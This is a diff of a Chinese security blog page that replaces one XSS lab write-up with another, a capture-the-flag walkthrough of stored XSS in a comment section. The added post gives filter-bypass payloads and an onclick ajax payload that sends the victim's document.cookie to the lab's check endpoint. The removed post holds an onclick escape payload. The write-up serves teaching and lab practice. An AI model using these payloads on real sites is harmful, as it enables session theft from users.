@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（四）跨站脚本XSS之逃逸过滤, Wkai">
+    <meta name="keywords" content="（六）跨站脚本XSS之数据库存储, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（四）跨站脚本XSS之逃逸过滤 | Wkai</title>
+    <title>（六）跨站脚本XSS之数据库存储 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -245,12 +245,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(10).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（四）跨站脚本XSS之逃逸过滤</h1>
+                    <h1 class="description center-align post-title">（六）跨站脚本XSS之数据库存储</h1>
                 </div>
             </div>
         </div>
@@ -383,7 +383,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-28
+                    2020-07-30
                 </div>
                 
 
@@ -399,60 +399,158 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li>当我们学会了打破网页结构之后，我们发现这个技巧有些情况并不适用。并不能成功的闭合标签，或者像<code>&lt;script&gt;</code>标签直接被过滤。这时候我们应该换一个思路,使用事件属性来突破。</li>
-<li>本篇靶场地址：<a href="https://tofu.exeye.run/event" target="_blank" rel="noopener">https://tofu.exeye.run/event</a></li>
+                <h4 id="一-靶场说明"><a href="#一-靶场说明" class="headerlink" title="一 靶场说明"></a>一 靶场说明</h4><ul>
+<li>本篇是对存储型xss的认识和利用。绕过过滤的方法也用到了前面介绍过的几个技巧。除此之外，我还分析了下靶场的实现原理。</li>
+<li>需要用到的技能：拼接绕过，引号转换</li>
+<li>靶场地址：<a href="https://tofu.exeye.run/commit/log_page" target="_blank" rel="noopener">https://tofu.exeye.run/commit/log_page</a></li>
+<li>靶场要求：利用评论区构造XSS，让受害者点击恶意评论，发送自己的cookie给发送给指定的URL，如果网站判定cookie是正确的，那么攻击者的页面将会弹窗出正确的flag</li>
+<li>所以我们需要注册两个账户，一个模拟攻击者，一个模拟受害者</li>
+<li>注册账户一：    attack    07034170    123</li>
+<li>注册账户二：    user        03174171    123</li>
 </ul>
 <br>
 
-<ul>
-<li>直接打开页面是一个输入框，右边的按钮会将输入的内容变成一个链接</li>
+<h4 id="二-具体步骤"><a href="#二-具体步骤" class="headerlink" title="二 具体步骤"></a>二 具体步骤</h4><ul>
+<li>打开靶场页面，可以看到，需要我们登录，可以注册账户</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(2).png" alt></p>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/QQ%E6%88%AA%E5%9B%BE20200802180022.png" alt></p>
 <ul>
-<li><p>按套路走，先看javascript的源代码，因为输入内容一般会先由js控制</p>
+<li>先用账户一去登录</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(5).png" alt></p>
+<ul>
+<li>登录进去后，页面上方是评论区，下方是评论框</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(10).png" alt></p>
+<ul>
+<li>我们先随便评论个123，然后用控制台找到源代码所在位置</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(4).png" alt></p>
+<ul>
+<li>然后我们先直接评论个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现这个弟弟直接将<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>过滤掉了</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(15).png" alt></p>
+<ul>
+<li>那我们只能尝试闭合log字段制造一个onclick事件了，评论”onclick=”alert(1)，但是很不幸，他还做了onclick的过滤，而且把第一个双引号转换成中文形式了。</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(3).png" alt></p>
+<ul>
+<li>这里用一个技能：拼接绕过，将一个<code>onclick</code>中再插入    一个<code>onclick</code>，这样中间的<code>onclick</code>被过滤掉后外面刚好拼接成一个新的<code>onclick</code></li>
+<li>但是我们的引号问题无法解决，这里可以尝试多打几个引号，看他到底会转换几个</li>
+<li>我们可以看到，这里输入了三个引号，结果只转换了第一个</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(8).png" alt></p>
+<ul>
+<li><p>所以我们的payload应该是这样的，前面用多个引号</p>
 </li>
-<li><pre class=" language-javascript"><code class="language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//定义按钮类url-btn的函数内容</span>
-            <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//获取输入框的内容</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token comment" spellcheck="true">//如果为空</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'none'</span><span class="token punctuation">)</span>   
-            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//如果不为空</span>
-                val <span class="token operator">=</span>  val<span class="token punctuation">.</span><span class="token function">toLocaleLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/script/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//这里会过滤掉&lt;>和script</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'block'</span><span class="token punctuation">)</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">'&lt;span style="padding-left: 2px">生成的链接为：&lt;a class="url" href="'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'">'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'&lt;/a>&lt;/span>'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将输入的内容变成href的value</span>
+<li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">""</span>onconclicklick<span class="token operator">=</span>"<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>
+</li>
+</ul>
+<ul>
+<li>查看源代码，成功构造了onclick事件</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(7).png" alt></p>
+<ul>
+<li>点击评论，也能直接触发弹窗</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(16).png" alt></p>
+<ul>
+<li><p>看来已经可以触发XSS了，那么就该上真正的payload了</p>
+</li>
+<li><p>和上次一样，让onclick事件执行ajax代码，所以我们的最终payload应该是：</p>
+</li>
+<li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">""</span> onclonclickick<span class="token operator">=</span>"$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`https://tofu.exeye.run/commit/check`</span></span><span class="token punctuation">,</span>
+                        type<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`post`</span></span><span class="token punctuation">,</span>
+                        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">,</span>xsser<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`07034170`</span></span><span class="token punctuation">}</span>
+                        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(13).png" alt></p>
+</li>
+<li><p>这段payload的意思是向指定的URL发送POST请求，请求中附带了点击者的cookie</p>
+</li>
+<li><p>接着我们再开另一个浏览器去登录账户二，模拟受害者点击恶意评论</p>
+</li>
+<li><p>不过我们先开启抓包</p>
+</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(17).png" alt></p>
+<ul>
+<li>可以看到我们发送了一个POST请求，数据内容包含了受害者的cookie和攻击者的用户名</li>
+<li>释放这个数据包，回到攻击者的账户，刷新页面，拿到正确flag</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(6).png" alt></p>
+<br>
+
+<h4 id="三-分析靶场原理-（过河拆桥）"><a href="#三-分析靶场原理-（过河拆桥）" class="headerlink" title="三 分析靶场原理 （过河拆桥）"></a>三 分析靶场原理 （过河拆桥）</h4><ul>
+<li>通过抓包分析，我们发现如果将受害者发送的POST请求包发送repeater，可以看到如果cookie正确（已经注册的账户cookie将会被记录），将会返回执行成功，同时发送的攻击者账号应该也会被记录下来</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(11).png" alt></p>
+<ul>
+<li>否则返回404not found</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(12).png" alt></p>
+<ul>
+<li><p>那么我们可以在payload中加入了响应成功就弹窗的代码：success:function(res){alert(res)}    （来个画蛇添足）</p>
+</li>
+<li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">""</span> onclonclickick<span class="token operator">=</span>"$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`https://tofu.exeye.run/commit/check`</span></span><span class="token punctuation">,</span>
+                        type<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`post`</span></span><span class="token punctuation">,</span>
+                        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">,</span>xsser<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`07034170`</span></span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span>
+                        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
+</li>
+</ul>
+<ul>
+<li>这样受害者点击后发送POST请求成功后就会将响应内容弹窗出来</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(9).png" alt></p>
+<ul>
+<li><p>接着，分析下部分源代码</p>
+</li>
+<li><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//访问指定URL，如果返回值不为2，则会将弹窗内容返回出来</span>
+            url<span class="token punctuation">:</span> <span class="token string">'https://tofu.exeye.run/commit/getPassCard'</span><span class="token punctuation">,</span>
+            type<span class="token punctuation">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span>
+            success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+               <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                   <span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+               <span class="token punctuation">}</span> 
             <span class="token punctuation">}</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">)</span></code></pre>
-</li>
-<li><p>分析源代码，我们输入的数据会变成链接，以及标签的内容，但是<code>&lt;script&gt;</code>会被过滤</p>
-</li>
-<li><p>如果只是过滤script这个字眼，那这里有个小技巧，可以在一个script中再插入个script，比如scrscriptipt，系统将script过滤掉后刚好面的字母又可以组成一个script</p>
-</li>
-<li><p>但是偏偏还过滤了&lt;&gt;，所以这就有点难办了，无法打破网页结构</p>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
 </li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(3).png" alt></p>
 <ul>
-<li><p>分析源码，我们发现还有个方法，就是构造一个onclick事件让他触发js代码</p>
+<li><p>这段代码我猜想他的意思是，向指定URL发送GET请求，服务器收到请求后，会根据记录中是否有你的cookie来决定响应内容，如果存在返回的是正确的flag，否则将会返回的是2，函数中判断res如果是2，那么将不会弹窗</p>
 </li>
-<li><p>那么怎么触发呢？</p>
+<li><p>所以靶场实现的原理应该是</p>
 </li>
-<li><p>我们同样需要先闭合href字段，再给末尾的引号凑对</p>
-</li>
-<li><p>所以我们的最终payload为：</p>
-</li>
-<li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span></code></pre>
-</li>
+<li><ul>
+<li>受害者点击恶意代码</li>
+<li>通过POST请求将自己的cookie和攻击者的账号发送给服务器</li>
+<li>服务器首先会判断发送的cookie是否存在，我猜想在注册的时候，服务器就已经将cookie和账号记录在某个地方了</li>
+<li>如果存在，攻击者的账号将会被记录到另一个地方，同时那里也会记录攻击者账号对应的cookie</li>
+<li>攻击成功后，攻击者再登录将会发送一个GET请求</li>
+<li>如果攻击者的账号已经被记录，那么返回的res就会是flag，否则返回值是2根本不会弹窗。</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png" alt="这样就成功构造了一个onclick事件"></p>
+</li>
+<li><p>通过抓包验证下</p>
 <ul>
-<li>点击链接成功触发弹窗</li>
+<li>首先我们记录下已经攻击成功的账号07034170的cookie：06aee212c454c2e4db96e0876b7e2ec0</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(1).png" alt></p>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(2).png" alt></p>
 <ul>
-<li>不过有个需要注意到的地方就是payload括号中不能用双引号，否则就不能凑成一个闭合，也就无法触发弹窗了</li>
+<li>然后我们再登录受害者的账号</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard.png" alt></p>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(1).png" alt></p>
+<ul>
+<li>此时记录的是受害者账号03174171账号的cookie</li>
+<li>通过抓包，受害者账号因为没有被服务器记录，所以响应的内容是2，不会弹窗</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard.png" alt="用受害者的cookie发送请求"></p>
+<ul>
+<li>这时候我们再将cookie换成攻击者03174171的</li>
+<li>可以看到返回了正确的flag</li>
+</ul>
+<p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%5Cclipboard(14).png" alt="用攻击者的cookie发送请求"></p>
+</li>
+</ul>
 
             </div>
             <hr/>
@@ -478,7 +576,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/">http://wkaiblog.cn/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/</a>
+                    <a href="http://wkaiblog.cn/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/">http://wkaiblog.cn/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -685,29 +783,32 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/">
+                <a href="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(2).png" class="responsive-img" alt="（五）跨站脚本XSS之长度限制">
+                        <img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(10).png" class="responsive-img" alt="（六）跨站脚本XSS之数据库存储">
                         
-                        <span class="card-title">（五）跨站脚本XSS之长度限制</span>
+                        <span class="card-title">（六）跨站脚本XSS之数据库存储</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-我们平时测试总会用alert(1)去测试是否存在xss漏洞，但真到了要利用这个漏洞。执行的代码就不是alert(1)这么简单了，一些输入点具有字符长度的限制，可能测试语句alert(1)可以顺利执行，但真正的利用代码就会很长，导致无法顺利
+                            一 靶场说明
+本篇是对存储型xss的认识和利用。绕过过滤的方法也用到了前面介绍过的几个技巧。除此之外，我还分析了下靶场的实现原理。
+需要用到的技能：拼接绕过，引号转换
+靶场地址：https://tofu.exeye.run/commit/l
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -716,6 +817,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -734,23 +836,25 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/">
+                <a href="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(5).png" class="responsive-img" alt="（一）跨站脚本XSS之基本反射型">
+                        <img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(5).png" class="responsive-img" alt="（三）跨站脚本XSS之多点输入">
                         
-                        <span class="card-title">（一）跨站脚本XSS之基本反射型</span>
+                        <span class="card-title">（三）跨站脚本XSS之多点输入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            什么是XSS？&emsp;通常指黑客通过“HTML 注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强
+                            
+本篇也是讲xss的攻击思路。当存在多个输入点时。开发者可能会有疏忽，并没有做好每个输入点的过滤防御,我们应该尽可能对每个输入点进行测试，抓住破绽。    靶场地址：https://tofu.exeye.run/output
+打开页面是这样
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
                             </span>
                         <span class="publish-author">
                             
